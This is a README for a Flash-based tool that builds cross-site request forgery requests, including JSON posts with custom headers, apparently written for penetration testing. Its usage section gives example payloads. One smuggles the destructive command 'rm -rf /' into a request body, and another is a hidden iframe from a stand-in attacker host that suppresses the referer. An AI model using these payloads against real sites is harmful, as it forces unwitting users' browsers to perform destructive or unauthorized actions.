This is a tool for testing CSRF against web services.  This is a complete test in that it can be used to create PoC exploits to exploit real victims and real systems in a real world scenario.  After all if it didn't work in the real world it wouldn't be a useful test.

Why is is this tool needed?
It is posible to use HTML/JS to perform a valid JSON request using parameter padding (http://blog.opensecurityresearch.com/2012/02/json-csrf-with-parameter-padding.html),  however while on a recent pentest the application I was testing was checking that incoming requests had a content-type of application/json.  Well as far as I know only Flash can do this. Flash has the unique ability to set arbitrary headers, including setting the content-type to an arbitrary value.  Flash can also set the body of the HTTP request to an arbitrary value.

Limitations of flash:
A content-type of "multipart/form-data" is forbidden, which means “cross-site file upload” exploits like this: http://www.exploit-db.com/exploits/7383/ no longer work. There are also a number of HTTP headers that are off limits: http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/URLRequestHeader.html.  But this is blacklist,  not a whitelist approach,  so this tool is able to set strange http headers used by a target system. Such as “are-you-a-hacker: nope!”.  This tool can only send GET and POST requests.  Unfortunately Flash cannot set PUT or DELETE requests,  as these HTTP methods are off-limits for cross-site requests. 

Install:
You just need the csrf.swf and csrf_payload.html files. You can run it locally using the file:// URI,  or you can use this copy which was uploaded to pastebin.com and swfcabin.com:
http://pastehtml.com/raw/byzok5ywn.html#url=http://www.google.com&content-type=application/json&body={'test':1}

Usage:
I wanted a flexible tool so that I didn't have to load up Flex Builder every time I wanted to test a PoC.  So I wrote a simple JavaScript interface that allows the user to build arbitrary http requests.  You specify the request in the fragment part of the url.  There are two special variables,  they are “url” and “body”. The url must always be set,  if the “body” variable is set then the request type is POST.  ALL other variables are assumed to be HTTP header elements.

The body, url and all http header elements of the request are assumed to be urlencoded and are passed though unescape() before being set. If you where testing a traditional POST CSRF request from your local system it would look like this:
file://var/code/CSRF-Request-Builder/csrf_payload.html#url=http://google.com&body=action%3Drun%26command%3Drm+-rf+%2F

In a real world attack scenario this would be placed into an iframe and originate from HTTPS. It is useful for CSRF attacks to originate from HTTPS because the referer will be omitted from the victim’s request.

<iframe width=0 height=0 src="https://some-attacker/csrf_payload.html#url=http://google.com&body=action%3Drun%26command%3Drm+-rf+%2F"></iframe> 

But you could make a request like that with just HTML/JS.  Here is a very simple JSON POST HTTP request:
file://var/code/CSRF-Request-Builder/csrf_payload.html#url=http://google.com&content-type=application/json&body={'test':1}

Notes on debugging:
A good method of debugging protocol interactions is load up wireshark.  Make the request with the original client,  and save that request to a file.  Try and recreate that request using the CSRF Request Builder and save that request to a file.  Then use a diff tool like meld to compare both of the requests.  Try and make them as identical as possible and hopefully the CSRF PoC will work for you.
